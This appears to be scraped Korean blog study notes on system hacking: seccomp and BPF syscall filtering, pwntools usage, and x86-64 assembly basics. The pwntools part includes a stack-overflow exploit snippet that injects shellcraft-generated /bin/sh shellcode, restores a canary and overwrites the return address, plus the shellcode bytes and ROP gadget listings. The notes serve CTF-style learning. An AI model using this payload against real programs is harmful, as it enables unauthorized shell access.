SECCOMP_MODE_STRICT read , write , exit , sigreturn 만 호출이 가능한 모드 이외의 시스템 콜이 호출되면 SIGKILL 시그널을 발생시킨다. SECCOMP_MODE_FILTER 원하는 시스템 콜을 필터에 넣고 관리 할 수 있는 모드 Linux 시스템콜 index 참조 seccomp 라이브러리를 활용할 시, seccomp-tools 로 검사하면 시스템콜의 번호가 0x40000000 보다 작은지 검사하는 로직이 검출된다는 특징이 있다. ex) 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 x86-64 ABI(Application Binary Interface) 는 x32 ABI 를 호환할 수 있지만, 두 ABI 는 엄연히 다르고 x86-64 ABI 인지 x32 ABI 인지를 구분짓기 위해 0x40000000 과 비교대소를 수행한다. x86-64 에서 시스템 콜을 호출하는 함수인 do_syscall_64 는 x86-64의 시스템 콜 호출에 실패하면 x32 시스템 콜 호출을 시도하도록 작성되어 있다. x32 시스템콜은 x86-64 시스템 콜에 __X32_SYSCALL_BIT 를 더한 값으로 지정되어 있으며, __X32_SYSCALL_BIT 의 값이 바로 0x40000000 이다. 설치 및 사용 apt를 이용한 설치 : apt install libseccomp-dev libseccomp2 seccomp 사용 방법: #include \u0026lt;linux/seccomp.h\u0026gt;\r...\rprctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT); // STRICT 모드로 동작 #include \u0026lt;linux/seccomp.h\u0026gt;\r...\r// filter mode 로 동작\rscmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); // 시스템 콜 호출시 발생할 이벤트 함수 설정. SCMP_ACT_KILL 은 따로 정의하지 않은 모든 시스템 콜에 대해 default 로 SIGKILL 반환한다는 뜻\r// seccomp_init(SCMP_ACT_ALLOW) 는 반대로 따로 정의하지 않은 모든 시스템 콜에 대해 default 로 실행을 허가한다는 뜻\rseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0); // 규칙 추가. \u0026#39;rt_sigreturn\u0026#39; 시스템 콜 허용\rseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0); // 규칙 추가. \u0026#39;open\u0026#39; 시스템 콜 금지\rseccomp_load(); // 위에서 반영한 규칙들 적용 strict mode 에서는 system call 호출시 __secure_computing_strict() 함수가 호출되고, __NR_seccomp_read, __NR_seccomp_write, __NR_seccomp_exit, __NR_seccomp_sigreturn 가 아닌 system call 이 호출되었다면 SIGKILL 을 발생시키고 SECCOMP_RET_KILL 을 반환한다. BPF (Berkeley Packet Filter) : 커널에서 지원하는 VM으로, 데이터를 비교하고 결과에 따라 특정 구문으로 분기하도록 설정 할 수 있어 네트워크 패킷을 분석하고 필터링 하는 용도로 주로 사용하였으나, 특정 시스템 콜 호출 시 수행 될 동작을 결정하는 용도롤도 사용이 가능하다. 명령어 조합 및 매크로를 사용하여 동작 구문을 작성 할 수 있다. 명령어: BPF_LD: 인자로 전달된 값 복사 BPF_JMP: 지정한 분기로 이동 BPF_JEQ: 비교 값이 참일 경우 지정한 위치로 이동 BPF_RET: 인자로 전달된 값 반환 매크로: BPF_STMT BPF_JUMP 사용 예시: BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr) // 매크로를 활용해 쉽게 명령어 실행\rBPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0) // argv[1], argv[2] 비교 결과에 따라 특정 offset(argv[3] or argv[4]) 로 분기 아키텍처 검사: // X86_64라면 다음 코드로 분기하고, 다른 아키텍처라면 SECCOMP_RET_KILL을 반환\r#define arch_nr (offsetof(struct seccomp_data, arch))\r#define ARCH_NR AUDIT_ARCH_X86_64\rBPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),\rBPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),\rBPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL), 시스템콜 검사: // ALLOW_SYSCALL 로 허가된 SYSTEM CALLL 외에는 SIGKILL 반환하며 시스템 종료\r#define ALLOW_SYSCALL(name) \\\rBPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_##name, 0, 1), \\\rBPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW\r#define KILL_PROCESS \\\rBPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL)\rBPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),\rALLOW_SYSCALL(rt_sigreturn),\rALLOW_SYSCALL(open),\rALLOW_SYSCALL(openat),\rALLOW_SYSCALL(read),\rALLOW_SYSCALL(write),\rALLOW_SYSCALL(exit_group),\rKILL_PROCESS, pctrl 설정 후 BPF로 시스템 콜 필터링 #include \u0026lt;fcntl.h\u0026gt;\r#include \u0026lt;linux/audit.h\u0026gt;\r#include \u0026lt;linux/filter.h\u0026gt;\r#include \u0026lt;linux/seccomp.h\u0026gt;\r#include \u0026lt;linux/unistd.h\u0026gt;\r#include \u0026lt;stddef.h\u0026gt;\r#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;sys/mman.h\u0026gt;\r#include \u0026lt;sys/prctl.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\r#define DENY_SYSCALL(name) \\\rBPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_##name, 0, 1), \\\rBPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)\r#define MAINTAIN_PROCESS BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)\r#define syscall_nr (offsetof(struct seccomp_data, nr))\r#define arch_nr (offsetof(struct seccomp_data, arch))\r/* architecture x86_64 */\r#define ARCH_NR AUDIT_ARCH_X86_64\rint sandbox() {\rstruct sock_filter filter[] = {\r/* Validate architecture. */\rBPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr),\rBPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0),\rBPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),\r/* Get system call number. */\rBPF_STMT(BPF_LD + BPF_W + BPF_ABS, syscall_nr),\r/* List allowed syscalls. */\rDENY_SYSCALL(open),\rDENY_SYSCALL(openat),\rMAINTAIN_PROCESS,\r};\rstruct sock_fprog prog = {\r.len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),\r.filter = filter,\r};\rif (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) {\rperror(\u0026#34;prctl(PR_SET_NO_NEW_PRIVS)\\n\u0026#34;);\rreturn -1;\r}\rif (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, \u0026amp;prog) == -1) {\rperror(\u0026#34;Seccomp filter error\\n\u0026#34;);\rreturn -1;\r}\rreturn 0;\r}\rint main(int argc, char* argv[]) {\rchar buf[256];\rint fd;\rmemset(buf, 0, sizeof(buf));\rsandbox();\rfd = open(\u0026#34;/bin/sh\u0026#34;, O_RDONLY);\rread(fd, buf, sizeof(buf) - 1);\rwrite(1, buf, sizeof(buf));\rreturn 0;\r} seccomp-tools SECCOMP 및 BPF가 적용된 코드를 분석하기 쉽게 하는 도구 설치방법: sudo apt install gcc ruby-dev\rsudo gem install seccomp-tools seccomp-tools git 주소 사용방법 seccomp-tools dump FILE_NAME : FILE_NAME 에 대한 seccomp 분석 결과 확인 예시 line CODE JT JF K\r=================================\r0000: 0x20 0x00 0x00 0x00000004 A = arch\r0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010\r0002: 0x20 0x00 0x00 0x00000000 A = sys_number\r0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005\r0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010\r0005: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0010\r0006: 0x15 0x03 0x00 0x00000002 if (A == open) goto 0010\r0007: 0x15 0x02 0x00 0x0000003b if (A == execve) goto 0010\r0008: 0x15 0x01 0x00 0x00000142 if (A == execveat) goto 0010\r0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW\r0010: 0x06 0x00 0x00 0x00000000 return KILL ","permalink":"https://aswinblue.github.io/Blog/post/systemhacking/exploit/","summary":"Exploit pwntool의 checksec 명령어로 어떤 보안이 적용되었는지 확인 가능하다. Shell Code exploit은 파일 읽고 쓰기(open-read-write, orw), 셸 명령 실행(execve) 권한을 취득하는 것을 목표로 한다. Shell 권한을 획득하기 위한 어셈블리 코드들의 모음을 \u0026lsquo;Shell Code\u0026rsquo; 라 칭한다. 환경세팅 pwntools checksec shellcraft ROPgadget one_gadget patchelf 취약점 공격 순서 바이너리를 분석하여 보호기법을 확인한다. checksec 명령어를 사용하여 바이너리에 적용된 보호기법을 확인하고, 적용 불가능한 exploit 기법을 추려낸다. checksec 참조 ldd 명령을 활용하여 의존성 관계를 확인한다. ldd 명령 코드를 확인하여 취약점 및 구조(stack 형태)을 파악한다 stack은 함수에서 선언된 순서대로 할당되지 않음에 주의하며, 무조건 assembly어를 통해 stack 주소에서 특정 변수의 위치를 확인하도록 한다.","title":"Exploit"},{"content":"pwntool 시스템 해킹을 위해 제작된 파이썬 라이브러리 바이너리를 실행하고 특정 input을 집어넣어 해킹(exploit)을 할수 있게 한다. 설치 리눅스의 apt와 파이썬의 pip 명령으로 설치가 가능하다. $ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\r$ python3 -m pip install --upgrade pip\r$ python3 -m pip install --upgrade pwntools 공식 메뉴얼 docker를 사용한 설치 방법 FROM ubuntu:18.04\rENV PATH=\u0026#34;${PATH}:/usr/local/lib/python3.6/dist-packages/bin\u0026#34;\rENV LC_CTYPE=C.UTF-8\rRUN apt update\rRUN apt install -y \\\rgcc \\\rgit \\\rpython3 \\\rpython3-pip \\\rruby \\\rsudo \\\rtmux \\\rvim \\\rwget\r# install pwndbg\rWORKDIR /root\rRUN git clone https://github.com/pwndbg/pwndbg\rWORKDIR /root/pwndbg\rRUN git checkout 2023.03.19\rRUN ./setup.sh\r# install pwntools\rRUN pip3 install --upgrade pip\rRUN pip3 install pwntools\r# install one_gadget command\rRUN gem install one_gadget\rWORKDIR /root 에러 발생시 해결 partially initialized module 'pwndbg' has no attribute 'lib' 에러 발생시에는 쉘 명령어에 export LANG=C.UTF-8 를 입력한다. 사용법 from pwn import * 을 통해 모듈을 로딩한다. 실행 process / remote target = process(파일경로) 로컬 파일을 exploit 하기위한 대상으로 설정한다. env 인자를 추가하여 프로그램 동작시 적용될 환경변수를 설정할 수 있다. 다음은 libc 파일을 원하는 경로에서 링킹 하도록 설정하는 구문이다. : target = process('./a.out', env= {\u0026quot;LD_PRELOAD\u0026quot; : \u0026quot;./libc.so.6\u0026quot;}) target = remote('목적지 ip', 목적지 port) ip:port 에 연결된 소켓을 exploit target으로 설정한다. 원격으로 접속한 목적지의 파일을 exploit 할 때 사용한다. 데이터 송수신 send\ntarget.send(b'data_to_send') process 혹은 remote 로 설정한 target 에 표준입력을 주입하는 함수 b'' 형태의 byte literal 을 전달해야 한다. p64 혹은 p32 로 변환하여 전달 할 수도 있다. send의 파생으로 sendline, sendafter, sendlineafter 등이 있다. target.sendline(b'data') : \u0026lsquo;data\u0026rsquo; 전달 후 \u0026lsquo;\\n\u0026rsquo; 추가 입력 target.sendlineafter(b'input:', b'data') : 출력으로 \u0026lsquo;input:\u0026lsquo;가 감지되면 target에 \u0026lsquo;data\u0026rsquo;를 입력 recv\ntarget으로 부터 들어오는 출력 데이터를 수신하는 함수. return 값은 byte literal 이므로 u64 혹은 u32 로 변환 후 사용한다. result = target.recv(len): len만큼 데이터를 수신, len보다 길이가 짧으면 오류 반환 파생으로 recvn, recvline, recvuntil, recvall 이 있다. result = target.recvn(5): 5byte 데이터를 수신, 수신한 길이가 len보다 짧으면 무한 대기 result = target.recvline(): 개행문자를 만날 때 까지 데이터 수신 result = target.recvuntil('name: '): \u0026ldquo;name: \u0026quot; 문자를 만날 때 까지 데이터 수신 (인자로 b\u0026rsquo;name\u0026rsquo;, \u0026rsquo;name\u0026rsquo; 모두 되는듯) result = target.recvall(): 프로세스가 종료될 때 까지 데이터 수신 packing / unpacking\n데이터를 변환하는 함수 p32(VALUE) : 32bit little endian으로 변환 p64(VALUE) : 64bit little endian으로 변환 u32(VALUE) : 32bit big endian으로 변환 u64(VALUE) : 64bit big endian으로 변환 interactive\nexploint 중 표준 입력/출력으로 프로세스에 직접 입력을 주입하고 출력을 확인하고 싶은 경우 target.interactive() 를 설정하면 \u0026rsquo;target\u0026rsquo; 에 직접 관여할 수 있다. asm\nasm(CODE) 형태로 CODE에 어셈블리 라인을 string 형태로 기입시 바이너리 코드를 반환한다. ex) asm('mov eax, SYS_execve') =\u0026gt; b'\\xb8\\x0b\\x00\\x00\\x00' disasm\ndisasm(BIN) 형태로 BIN에 바이너리 데이터를 입력시 어셈블리 명령어를 반환한다. ex) disasm(b'\\xb8\\x0b\\x00\\x00\\x00') =\u0026gt; 0: b8 0b 00 00 00 mov eax, 0xb' 실행파일 분석 ELF ELF 파일 헤더를 참조할 때 사용 가능 elf = ELF(파일명) 형태로 참조하면 dictionary 형태의 데이터를 반환 받을 수 있다. elf.symbols[함수명]: \u0026rsquo;elf\u0026rsquo; 가 라이브러리 파일일 때, 라이브러리 함수의 offset 을 확인할 수 있다. elf.symbols[변수명]: \u0026rsquo;elf\u0026rsquo; 가 실행프로그램일 때, 변수의 주소를 확인할 수 있다. elf.plt[함수명]: \u0026rsquo;elf\u0026rsquo; 가 실행프로그램일 때, plt 테이블에서 함수가 매핑된 주소를 확인할 수 있다. elf.got[함수명] \u0026rsquo;elf\u0026rsquo; 가 실행프로그램일 때, got 테이블에서 함수가 매핑된 주소를 확인할 수 있다. elf.search[문자열] 으로 ELF 에 저장된 문자열의 주소를 확인한다. context context.log_level context.log_level 을 설정하여 디버깅을 위한 로그 레벨을 설정 할 수 있다. context.arch exploit 대상의 아키텍처에 대한 정보를 설정할 수 있다. context.arch = \u0026quot;amd64\u0026quot; 형태로 설정 i386, arm, mips 등을 설정 할 수 있다. 디버깅 pause pause() 함수를 호출하여 진행상황을 일시 정지 할 수 있다. gdb 로 디버깅을 하기 위해 주로 사용한다. gdb 명령어 중 gdb attach -p {PROCESS_ID} 를 참조하여 디버깅이 가능하다. gdb.attach() target = process(파일경로) 로 프로그램을 실행시켰다면 gdb.attach(target) 명령으로 gdb를 연동시킬 수 있다. 예시 stack frame안의 버퍼와 canary를 획득한 경우, 버퍼에 shell 실행 코드를 주입하고 stack overflow로 return code를 버퍼의 주소로 변경한 후 canary를 복원시키면 쉘을 획득할 수 있다.\nfrom pwn import *\rtarget = process(TARGET_PROGRAM)\r# \u0026#39;canary\u0026#39; 는 추출해온 스택 카나리 값이 littel endian형태로 담겨있다.\rshell_code = asm(shellcraft.sh()) # pwn tool로 쉘 실행코드 생성 및 바이너리로 변환\rpayload = shell_code.ljust(buffer_to_canary, b\u0026#39;A\u0026#39;) + canary + b\u0026#39;B\u0026#39; * 0x8 + p64(buffer_address) # 버퍼에 쉘 코드를 넣고, 남는 칸은 아무 문자로 메꾼다. 그 후 카나리를 잘 복원하고 SFP는 아무 숫자나 채워넣고 리턴 주소를 버퍼 주소로 덮어씀\r# gets() receives input until \u0026#39;\\n\u0026#39; is received\rtarget.sendlineafter(b\u0026#39;Input:\u0026#39;, payload) # 타겟 프로그램에서 Input을 받아 \u0026#39;buffer_address\u0026#39; 주소에 받도록 프로그램이 짜여져 있다.\rtarget.interactive() # 쉘을 획득하고 쉘을 유저가 활용할 수 있게 반환한다. 기타 도구 checksec pwntool과 함께 설치되는 도구로, 바이너리에 적용되는 보호 기법(ex: RELRO, Canary, NX, PIE) 을 확인할 수 있다. ASLR은 리눅스에서 기본적으로 적용되어있으므로, 특별한 언급이 없다면 default on이라 생각하면 된다. ex) Arch: amd64-64-little\rRELRO: Partial RELRO\rStack: Canary found\rNX: NX enabled\rPIE: No PIE (0x400000)\rRWX: Has RWX segments shellcraft pwntool과 함께 설치되는 파이썬 모듈로 쉘 코드의 함수들을 반환한다. 시스템 콜 테이블 참조 shellcraft.sh() : 쉘 실행 코드 shellcraft.open() : 쉘 코드 open(인자 필요) shellcraft.read() : 쉘 코드 read(인자 필요) shellcraft.write() : 쉘 코드 write(인자 필요) shellcraft.exit() : 쉘 코드 exit asm() 함수와 함께 조합하면 쉘코드를 바이너리로 만들어 프로그램에 주입할 수 있다. ex) shellcraft.sh() : /* execve(path=\u0026#39;/bin///sh\u0026#39;, argv=[\u0026#39;sh\u0026#39;], envp=0) */\r/* push b\u0026#39;/bin///sh\\x00\u0026#39; */\rpush 0x68\rpush 0x732f2f2f\rpush 0x6e69622f\rmov ebx, esp\r/* push argument array [\u0026#39;sh\\x00\u0026#39;] */\r/* push \u0026#39;sh\\x00\\x00\u0026#39; */\rpush 0x1010101\rxor dword ptr [esp], 0x1016972\rxor ecx, ecx\rpush ecx /* null terminate */\rpush 4\rpop ecx\radd ecx, esp\rpush ecx /* \u0026#39;sh\\x00\u0026#39; */\rmov ecx, esp\rxor edx, edx\r/* call execve() */\rpush SYS_execve /* 0xb */\rpop eax\rint 0x80 ex) asm(shellcraft.sh()) : b'jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80' ROPgadget 바이너리에서 gadget 값들을 확인할 수 있는 툴이다. gadget들의 주소를 확인하여 exploit에 활용할 수 있다. ROPgadget --binary FILE_NAME 을 입력하면 FILE_NAME 에서 gadget들을 찾아 출력 해 준다. ex) ROPgadget \u0026ndash;binary /bin/bash 의 일부이다. 0x000000000008b4fb : xor r9d, r9d ; jmp 0x8b46b\r0x00000000000c0e30 : xor r9d, r9d ; jmp 0xc0c50\r0x00000000000c7caa : xor r9d, r9d ; jmp 0xc7cb3\r0x00000000000cc0ed : xor r9d, r9d ; jmp 0xcb089\r0x000000000007f2a5 : xor r9d, r9d ; lea eax, [rdx + 1] ; jmp 0x7ef68\r0x000000000006dc63 : xor r9d, r9d ; mov dword ptr [rbx], eax ; jmp 0x6cfd8\r0x00000000000618ec : xor r9d, r9d ; movsxd rax, r14d ; jmp 0x61792\r0x000000000006d9b4 : xor r9d, r9d ; xor r13d, r13d ; mov dword ptr [rbx], eax ; jmp 0x6cfd8\r0x00000000000757b3 : xor rax, qword ptr [r8] ; add byte ptr [rdi + 2], bh ; jmp 0x78b80\r0x00000000000558c2 : xor rax, rax ; test r13, r13 ; jne 0x558e4 ; jmp 0x558f1 --re REGULAR_EXPRESSION 옵션을 넣어 정규 표현식으로 결과를 필터링 할 수 있다. (|grep 한 것과 유사한 효과) ex) ROPgadget \u0026ndash;binary /bin/bash \u0026ndash;re \u0026ldquo;pop rdi\u0026rdquo; 의 결과 일부 0x00000000000c5ac8 : pop rdi ; jmp rax\r0x00000000000b9c04 : pop rdi ; jne 0xb9c42 ; jmp 0xb9ce1\r0x00000000000bfc3a : pop rdi ; jne 0xbf8c3 ; jmp 0xbf8cb\r0x000000000005ca25 : pop rdi ; jns 0x5ca34 ; add al, ch ; jb 0x5c9f0 ; add dword ptr [rax], eax ; jmp 0x5c77f\r0x000000000005cadd : pop rdi ; or al, 0 ; mov rdx, qword ptr [rax + rcx] ; jmp 0x5c6c0\r0x000000000005cffc : pop rdi ; or al, 0 ; xor ebx, ebx ; xor ebp, ebp ; jmp 0x5d014\r0x000000000007542d : pop rdi ; out dx, eax ; or al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x752f8\r0x00000000000a69fc : pop rdi ; pop r8 ; jmp 0xa5ca0\r0x00000000000665ca : pop rdi ; pop rbp ; ret\r0x0000000000030934 : pop rdi ; ret\r0x00000000000aca60 : pop rdi ; sete dl ; or eax, edx ; movzx ebp, al ; jmp 0xac482\r0x00000000000ba113 : pop rdi ; sete sil ; or edx, esi ; jmp 0xb9eda\r0x00000000000b5690 : pop rdi ; xor ecx, ecx ; jmp 0xb56be\r0x00000000000493b2 : pop rsi ; pop rdi ; jmp 0x48b7d\r0x00000000000a6ca9 : pop rsi ; pop rdi ; jmp 0xa5ca0\r0x0000000000070836 : push rsi ; pop rdi ; add al, 0 ; jmp 0x705f1\r0x0000000000073205 : shr al, 5 ; pop rdi ; add dword ptr [rax], eax ; mov r13, rax ; jmp 0x72db8\r0x00000000000707e1 : stosd dword ptr [rdi], eax ; pop rdi ; add al, 0 ; jmp 0x7043d One_gadget exploit 에 필요한 gadget 들을 일일이 찾거나, objdump, readelf 등으로 매번 함수들을 찾지 않고 명령어 한 번으로 libc 라이브러리에서 execve(\u0026quot;/bin/sh\u0026rdquo;) 를 실행 시킬 수 있도록 하는 gadget 을 알려주는 툴이다. 다음 명령어로 설치가 가능하다. sudo apt-get install ruby\rsudo gem install one_gadget Patchelf 바이너리가 동적 라이브러리를 참조하는 경로를 변경할 수 있는 툴이다.\napt-get install patchelf 명령어로 설치가 가능하다.\nGithub 코드 patchelf --set-interpreter 라이브러리 실행파일 : \u0026lsquo;실행파일\u0026rsquo; 실행시 \u0026lsquo;라이브러리\u0026rsquo; 파일을 동적링크로 적용하도록 세팅한다.\ngdb 실행파일 명령으로 gdb를 실행한 후, vmmap 명령으로 메모리 레이아웃을 확인했을 때, 위에서 지정한 \u0026lsquo;라이브러리\u0026rsquo; 파일이 표시되면 정상 적용 된 것 patchelf --replace-needed {원본_라이브러리} {대체_라이브러리} {실행파일} 명령으로 이미 주입된 라이브러리 의존성을 변경 가능하다.\n만약 patchelf 를 적용한 이후 실행 파일 실행 시 permission denied 오류가 발생한다면, 라이브러리에 실행 권한이 적용되어있는지 확인 해 본다.\nchmod a+x {라이브러리_파일} 명령으로 실행 권한 추가가 필요하다. ","permalink":"https://aswinblue.github.io/Blog/post/systemhacking/pwntool/","summary":"pwntool 시스템 해킹을 위해 제작된 파이썬 라이브러리 바이너리를 실행하고 특정 input을 집어넣어 해킹(exploit)을 할수 있게 한다. 설치 리눅스의 apt와 파이썬의 pip 명령으로 설치가 가능하다. $ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\r$ python3 -m pip install --upgrade pip\r$ python3 -m pip install --upgrade pwntools 공식 메뉴얼 docker를 사용한 설치 방법 FROM ubuntu:18.04\rENV PATH=\u0026#34;${PATH}:/usr/local/lib/python3.6/dist-packages/bin\u0026#34;\rENV LC_CTYPE=C.UTF-8\rRUN apt update\rRUN apt install -y \\\rgcc \\\rgit \\\rpython3 \\\rpython3-pip \\\rruby \\\rsudo \\\rtmux \\\rvim \\\rwget\r# install pwndbg\rWORKDIR /root\rRUN git clone https://github.","title":"Pwntool"},{"content":"Assembly 기계어로 1대1 대응 가능한 언어로, human readable 한 언어 중 가장 기계어에 가까운 언어이다. 기계어로 컴파일 직전에 어셈블리어로 변환을 거친다. operation code(명령어) 와 operand(피연산자) 로 구성된다. 명령어는 데이터 이동, 산술연산, 논리연산, 비교, 분기, 스택, 프로시저, 시스템콜의 종류가 있다. 피연산자 자리에는 상수(Immediate Value), 레지스터(Register), 메모리(Memory)가 올 수 있다. 숫자를 넣으면 상수이다. [] 로 둘러싸인 숫자는 메모리이다. 메모리 피연산자 앞에는 메모리의 크기를 나타내는 크기 지정자(Size Directive)가 붙을 수 있다. BYTE: 8bit BYTE PTR rax : rax 레지스터의 데이터를 1바이트만큼 참조 WORD: 16bit WORD PTR [0x8048000] : 0x8048000의 데이터를 2바이트만큼 참조 DWORD: 32bit QWORD: 64bit 명령어 mov \u0026ldquo;값\u0026quot;을 레지스터리나 메모리에 저장하는 명령 mov dst, src : src 값을 dst에 덮어씀 mov rdi, rsi : rsi의 값을 rdi에 대입 mov QWORD PTR[rdi], rsi : rsi의 값을 rdi가 가리키는 주소에 대입 mov QWORD PTR[rdi + 8 * rcx], rsi : rsi의 값을 (rdi + 8 * rcx)가 가리키는 주소에 대입 dst = 레지스터, src = 레지스터 : src가 가리키는 주소의 값을 dst가 가리키는 주소의 값에 덮어씀 dst = 메모리, src = 레지스터 : src가 가리키는 주소의 값을 dst가 가리키는 주소의 값에 덮어씀 dst = 레지스터, src = 메모리 : src가 가리키는 주소의 값을 dst가 가리키는 주소의 값에 덮어씀 dst = 메모리, src = 메모리 : 불가능 mov dst, [mem + 4] : mem + 4 주소에 저장된 값을 dst에 덮어씀 dst 값으로는 주소나 포인터가 올 수 있다. lea \u0026ldquo;주소\u0026quot;를 레지스터리나 메모리에 저장하는 명령 lea dst, src : src값을 dst에 덮어씀 (src는 주소값) lea rsi, [rbx + 8 * rcx] : (rbx + 8 * rcx) 를 rsi에 대입 lea dst, [mem + 4] : mem 값에 4를 더한 값을 dst에 덮어씀 add add dst, src : dst 에 있는 값에 src 값을 더해 dst에 덮어씀 dst는 주소, src는 값 sub sub dst, src: : dst 에 있는 값에 src 값을 빼고 dst 주소에 덮어씀 dst는 주소, src는 값 inc inc op : op 에 있는 값을 1 증가시킴 op는 주소 dec dec op : op 에 있는 값을 1 감소시킴 op는 주소 and and dst, src : src와 dst 값을 and 연산한 결과를 dst에 저장 or or dst, src : src와 dst 값을 or 연산한 결과를 dst에 저장 xor xor dst, src : src와 dst 값을 xor 연산한 결과를 dst에 저장 not not op : op 값을 not 연산한 값을 op에 저장 comp cmp rax, rbx : rax 값과 rbx 값을 비교한 후, 결과에 따라 플래그 설정 if rax == rbx: ZF = 1 test test rax, rbx : rax 값과 rbx 값을 and 연산 후, 결과에 따라 플래그 설정 jmp jmp addr : addr 주소로 rip를 이동한다. je je addr : 직전에 비교한 cmp rax rbx 연산에서 rax == rbx 라면 addr로 rip 를 이동한다. jg jg addr : 직전에 비교한 cmp rax rbx 연산에서 rax \u0026gt; rbx 라면 addr로 rip 를 이동한다. push push val : 스택의 최상단에 \u0026lsquo;val\u0026rsquo; 값을 집어넣는다. rsp 를 한칸 위로 옮기고, 그 위치에 \u0026lsquo;val\u0026rsquo;을 대입한다. rsp -= 8; [rsp] = val 동작과 동일하다. push val 형태로는 4byte 데이터밖에 주입할 수 없으므로, 4byte를 초과하는 데이터를 주입할 때는 값을 레지스터에 대입하고, 레지스터를 push한다. mov rax 0x0102030405060708\rpush rax pop pop rax : 스택의 최상단에 있는 값을 \u0026lsquo;rax\u0026rsquo; 주소에 대입한다. rsp 위치의 값을 반환하고, rsp 를 한칸 밑으로 옮긴다. rsp += 8; reg = [rsp-8] 동작과 동일하다. call call addr \u0026lsquo;addr\u0026rsquo; 위치의 프로시저를 호출 \u0026lsquo;push\u0026rsquo; 명령과 \u0026lsquo;jump\u0026rsquo; 명령으로 구현할 수 있다. 스택에 다음 실행 주소를 push한다. (push rip + 8) rip를 실행시키고 싶은 명령어가 적힌 주소로 이동한다. (jump) leave rsp를 rbp + 8 위치로 이동한다. rbp도 갱신한다. mov rsp, rbp; pop rbp 명령과 동일하다. ret rip를 rsp가 가리키는 스택의 주소에 담긴 값으로 이동한다. pop rip 명령과 동일하다. 시스템콜 운영체제는 하드웨어 및 소프트웨어를 총괄하며, 접근 권한을 제한하여 해킹으로부터 컴퓨터를 보호하기 위해 커널 모드와 유저 모드로 권한을 분리한다. 시스템 콜은 유저모드에서 시스템에게 커널 모드에서 실행할 수 있는 동작들을 요청하는 동작이다. 유저가 시스템 콜을 호출하면 커널은 이를 실행하고, 결과를 유저에게 반환한다. 레지스터 범용 레지스터 x86-64 아키텍처 레지스터 참조 r0 ~ r15까지 존재하며, r0 ~ r7 까지는 이름이 붙고, r8부터 r15까지는 숫자로 부른다. rax : (Extended Accumulator Register) 사칙연산에서 자동으로 피연산자의 값이 저장된다. 논리 연산(덧셈, 뺄셈 등)의 결과값이 저장된다. 피연산자와 별개로 데이터가 저장된다. 시스템 콜의 실질적인 번호를 가리킴 시스템 콜의 반환값도 rax에 저장됨 x64구조에서 rax 를 사용하고, x86구조에서는 eax 를 사용했다. ax : eax가 사용되기 이전, CPU의 word가 16bit 일 때 사용되던 레지스터 큰 의미는 없지만 관습처럼 사용되며 eax에서 하위 2byte를 자른 값을 나타낸다. ax 는 다시 ah와 al로 한 byte씩 나뉜다. ah : ax에서 상위 1byte al : ax에서 하위 1byte byte_8 byte_7 byte_6 byte_5 byte_4 byte_3 byte_2 byte_1 rax_8 rax_7 rax_6 rax_5 rax_4 rax_3 rax_2 rax_1 - - - - eax_4 eax_3 eax_2 eax_1 - - - - - - - ax_2 - - - - - - - ah rbx(ebx) : (Extended Base register)메모리 주소를 저장하는 용도로 사용 rcx(ecx) : (Extended Counter Register)CPU loop counter rdx(edx) : 시스템 콜 실행 시 세 번째 인자의 주소 / (Extended Data Register) rsi : 시스템 콜 실행시 두 번째 인자의 주소 / (source index) 데이터 이동시 원본을 가리키는 주소 x64구조에서 rsi 를 사용하고, x86구조에서는 esi 를 사용했다. rdi : 함수 실행시 첫 번째 인자의 주소 / 시스템 콜 실행시 첫 번째 인자의 주소 / (destination index) 데이터 이동시 목적지를 가리키는 주소 x64구조에서 rdi 를 사용하고, x86구조에서는 edi 를 사용했다. rbp : (Base Register Pointer)스택 복귀 주소 rbp 주소에는 함수가 종료되고 함수를 호출한 함수(caller) 의 스택 프레임으로 rbp를 이동하기 위한 주소 SFP(Stack Frame Pointer) 가 저장된다. 함수 호출시 호출자(caller)의 SFP를 stack에 넣고, 실행된 함수가 끝날 때 이를 pop하여 함수가 호출된 코드 라인으로 복귀할 수 있다. 즉, 함수 호출 시마다 push rbp 코드를 보게 될 것이다. x64구조에서 rbp 를 사용하고, x86구조에서는 ebp 를 사용했다. ebp : 스택 프레임 최하단의 주소값 (Base pointer register) x86에서 사용하는 값으로, x64에서는 rbp로 대체된다. 새로운 함수가 